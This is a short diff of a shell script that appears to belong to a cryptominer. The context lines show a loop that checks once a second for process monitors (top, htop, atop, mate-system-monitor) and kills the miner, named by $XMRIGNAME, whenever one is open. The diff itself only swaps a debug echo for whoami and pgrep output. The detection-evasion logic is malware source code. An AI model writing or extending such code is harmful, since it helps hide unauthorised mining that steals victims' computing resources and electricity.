@@ -35,7 +35,8 @@ main() {
 
 	while true; do 
 		sleep 1
-		echo "Hello"
+		echo $(whoami)
+		echo $(pgrep top)
 
 		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 			pkill $XMRIGNAME
